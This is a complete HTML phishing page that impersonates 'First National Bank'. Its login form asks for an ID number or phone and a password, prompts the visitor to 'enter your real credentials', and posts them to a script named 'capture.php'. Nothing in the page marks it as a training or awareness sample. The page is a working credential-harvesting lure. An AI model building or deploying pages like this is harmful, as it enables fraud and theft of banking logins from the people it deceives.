<!DOCTYPE html>
<html>
<head>
  <title>First National Bank - Secure Login</title>
  <style>
    /* Full-page DCI background */
    body {
      font-family: Arial, sans-serif;
      background: url('https://assets.citizen.digital/125111/conversions/dci-og_image.webp') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
    }

    /* Login box: clean, official, readable */
    .login-box {
      background: rgba(255, 255, 255, 0.93);
      color: #004680;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
      width: 360px;
      text-align: center;
    }

    .login-box h2 {
      margin-top: 0;
      font-size: 24px;
      color: #004680;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 15px;
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background: #004680;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-box button:hover {
      background: #003366;
    }

    .footer {
      font-size: 11px;
      margin-top: 20px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>First National Bank</h2>
    <p>Enter your  real credentials to continue</p>
    <form action="capture.php" method="POST">
      <input type="text" name="username" placeholder="ID Number or Phone" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login Securely</button>
    </form>
    <div class="footer">
      <strong></strong><br>
      
    </div>
  </div>
</body>

</html>
